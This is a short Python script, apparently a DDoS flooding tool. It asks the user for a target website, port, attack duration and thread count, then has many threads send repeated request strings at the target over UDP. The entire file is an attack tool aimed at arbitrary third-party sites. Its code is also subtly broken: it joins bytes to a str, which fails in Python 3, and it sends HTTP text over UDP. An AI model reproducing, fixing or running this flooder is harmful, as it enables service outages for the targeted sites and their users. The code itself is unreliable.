import socket
import threading
import time

def ddos(target, port, duration):
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Set a timeout for the socket
    sock.settimeout(1)
    # Start time
    start_time = time.time()

    while True:
        try:
            # Send data
            sock.sendto(b"GET /" + target + " HTTP/1.1\r\n" + "Host: " + target + "\r\n\r\n", (target, port))
            # If the duration has been reached, break the loop
            if time.time() - start_time > duration:
                break
        except socket.error:
            pass

    print(f"[+] Attack finished on {target} at port {port}")

def main():
    target = input("Enter the target website: ")
    port = int(input("Enter the port (80 or 443): "))
    duration = int(input("Enter the duration of the attack in seconds: "))
    threads = int(input("Enter the number of threads: "))

    print("[+] Starting attack on {} at port {} for {} seconds with {} threads.".format(target, port, duration, threads))

    for _ in range(threads):
        thread = threading.Thread(target=ddos, args=(target, port, duration))
        thread.start()

if __name__ == "__main__":
    main()